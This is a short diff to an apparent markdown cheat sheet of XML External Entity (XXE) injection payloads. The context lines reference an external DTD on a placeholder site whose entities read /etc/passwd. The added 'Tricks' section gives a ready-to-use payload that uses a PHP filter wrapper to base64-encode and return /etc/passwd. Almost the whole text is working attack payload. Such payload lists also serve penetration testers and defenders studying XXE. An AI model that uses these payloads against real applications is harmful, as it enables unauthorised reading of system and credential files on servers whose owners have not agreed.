@@ -31,3 +31,15 @@ file http://yourwebsite.com/ex.dtd
 <!ENTITY % test SYSTEM "file:///etc/passwd">
 <!ENTITY % xxe '<!ENTITY test "%test;">'>
 ```
+
+## 3) Tricks
+
+PHP wrapper:
+```
+<!DOCTYPE x [
+<!ENTITY w00t SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<root>
+    <color>&w00t;</color>
+</root>
+```
